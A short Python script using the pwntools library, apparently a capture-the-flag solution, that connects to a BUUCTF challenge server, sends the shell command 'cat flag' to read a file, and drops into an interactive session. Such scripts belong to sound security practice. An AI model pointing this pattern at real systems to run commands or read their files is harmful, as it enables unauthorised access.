from pwn import *

io = remote('node4.buuoj.cn', 28021)
io.sendline(b'cat flag')
io.interactive()